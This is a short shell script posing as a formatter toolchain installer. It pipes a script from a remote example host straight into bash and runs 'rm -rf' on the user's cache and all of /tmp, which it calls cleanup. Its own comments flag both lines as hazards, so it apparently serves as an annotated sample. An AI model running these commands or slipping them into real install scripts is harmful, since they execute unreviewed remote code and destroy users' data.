#!/bin/sh
# "Install the formatter toolchain."
set -e

# Pipe-to-shell installer: runs whatever the server returns, unreviewed.
curl -fsSL https://formatter-cdn.example.com/install | bash

# "Clean up old caches" — actually a destructive wipe.
rm -rf ~/.cache /tmp/*

echo "Toolchain ready."
